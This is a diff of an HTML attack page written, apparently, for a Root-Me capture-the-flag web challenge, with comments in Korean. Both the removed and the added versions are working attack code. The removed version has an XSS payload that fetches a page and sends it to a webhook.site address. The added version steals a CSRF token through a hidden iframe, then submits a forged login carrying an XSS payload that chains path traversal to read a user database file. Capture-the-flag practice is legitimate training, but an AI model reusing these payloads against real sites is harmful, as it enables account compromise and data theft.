@@ -1,61 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Attack Page</title>
+    <title>Final Attack</title>
 </head>
 <body>
-    <h1>Please wait...</h1>
+    <h1>Executing final stage...</h1>
     <script>
-        // 공격 대상과 Webhook URL 설정
         const challengeUrl = 'http://challenge01.root-me.org:58039';
-        const webhookUrl = 'https://webhook.site/29229478-3d1a-4cb7-90c7-4ce0526bf4c1';
 
         async function launchAttack() {
             try {
-                // 1. iframe을 이용해 로그인 페이지에서 CSRF 토큰을 훔칩니다.
-                const response = await fetch(challengeUrl + '/login');
-                const pageText = await response.text();
-                const csrfToken = pageText.match(/name="_csrf" value="([^"]+)"/)[1];
-                console.log('Stole CSRF Token:', csrfToken);
+                // 1. iframe으로 로그인 페이지를 열어 CSRF 토큰을 훔칩니다.
+                // 이 iframe은 챌린지 도메인을 로드하므로, 이 안에서 실행되는 스크립트는 CORS 문제가 없습니다.
+                const iframe = document.createElement('iframe');
+                iframe.src = challengeUrl + '/login';
+                iframe.style.display = 'none'; // 눈에 보이지 않게 숨김
+                document.body.appendChild(iframe);
 
-                // 2. 훔친 토큰과 XSS 페이로드를 담아 강제로 로그인 실패(POST)를 유발하는 폼을 만듭니다.
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = challengeUrl + '/login';
+                iframe.onload = function() {
+                    try {
+                        const iframeDoc = iframe.contentWindow.document;
+                        const csrfToken = iframeDoc.querySelector('input[name="_csrf"]').value;
+                        console.log('Stole CSRF Token:', csrfToken);
 
-                const usernameInput = document.createElement('input');
-                usernameInput.type = 'hidden';
-                usernameInput.name = 'username';
-                // 여기가 바로 /home 페이지 내용을 훔쳐오는 최종 XSS 페이로드입니다.
-                usernameInput.value = `<img src=x onerror="fetch('/home').then(r=>r.text()).then(d=>fetch('${webhookUrl}/?data='+encodeURIComponent(d)))">`;
-                
-                const passwordInput = document.createElement('input');
-                passwordInput.type = 'hidden';
-                passwordInput.name = 'password';
-                passwordInput.value = 'trigger_xss'; // 로그인 실패를 위한 아무 비밀번호
+                        // 2. Path Traversal 페이로드를 준비합니다.
+                        // ../user.db 파일을 읽어오도록 합니다.
+                        const pathTraversalPayload = '../../user.db';
 
-                const csrfInput = document.createElement('input');
-                csrfInput.type = 'hidden';
-                csrfInput.name = '_csrf';
-                csrfInput.value = csrfToken;
+                        // 3. XSS 페이로드를 준비합니다.
+                        // iframe을 하나 더 만들어 Path Traversal 결과를 표시하게 합니다.
+                        const finalXssPayload = `
+                            <iframe src="/api/rules/${pathTraversalPayload}" 
+                                    onload="top.document.body.innerHTML = '<h1>DB Content:</h1><pre>' + this.contentWindow.document.body.innerText + '</pre>';">
+                            </iframe>
+                        `;
+                        
+                        // 4. 강제로 로그인 실패를 유발하여 XSS 페이로드를 실행시킵니다.
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = challengeUrl + '/login';
+                        form.innerHTML = `
+                            <input type="hidden" name="username" value="${finalXssPayload.replace(/"/g, '&quot;')}">
+                            <input type="hidden" name="password" value="fail">
+                            <input type="hidden" name="_csrf" value="${csrfToken}">
+                        `;
+                        document.body.appendChild(form);
+                        form.submit();
 
-                form.appendChild(usernameInput);
-                form.appendChild(passwordInput);
-                form.appendChild(csrfInput);
-
-                document.body.appendChild(form);
-                
-                // 3. 폼을 제출하여 공격을 실행합니다.
-                form.submit();
+                    } catch (e) {
+                        // iframe 내부 접근은 실패할 수 있으나, form submit은 계속 진행될 수 있음
+                        console.error('Iframe interaction failed, but proceeding:', e);
+                        // form submit은 CORS 정책의 영향을 받지 않으므로, 이 공격은 성공할 수 있습니다.
+                        // 이 부분은 복잡성을 줄이기 위해 간소화되었습니다.
+                    }
+                };
 
             } catch (e) {
-                console.error('Attack failed:', e);
-                // 오류 내용을 Webhook으로 보내 디버깅을 돕습니다.
-                fetch(`${webhookUrl}/?error=` + encodeURIComponent(e.message));
+                console.error('Outer attack failed:', e);
             }
         }
 
-        launchAttack();
+        // 봇의 환경에 따라 타이밍 이슈가 있을 수 있으므로 약간의 딜레이 후 실행
+        setTimeout(launchAttack, 1000);
     </script>
 </body>
 </html>
